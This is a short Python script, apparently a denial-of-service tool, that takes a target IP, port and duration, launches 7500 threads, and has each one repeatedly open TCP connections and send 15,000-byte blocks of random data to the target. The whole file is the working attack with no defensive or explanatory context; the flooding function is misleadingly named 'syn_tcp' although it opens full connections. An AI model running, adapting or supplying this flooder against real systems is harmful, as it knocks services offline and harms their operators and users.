import random
import threading
import socket
import time
import sys

if len(sys.argv) != 4:
    print(f"Usage: IP PORT TIME")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])
time_limit = int(sys.argv[3])
packet = 75000
thread_count = 7500
hevin = random._urandom(15000)

def syn_tcp():
    while True:
        try:
            h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            h.connect((ip, port))
            h.send(hevin)
            for _ in range(packet):
                h.send(hevin)
        except:
            h.close()
            break

for _ in range(thread_count):
    thread = threading.Thread(target=syn_tcp)
    thread.start()

time.sleep(time_limit)
sys.exit()
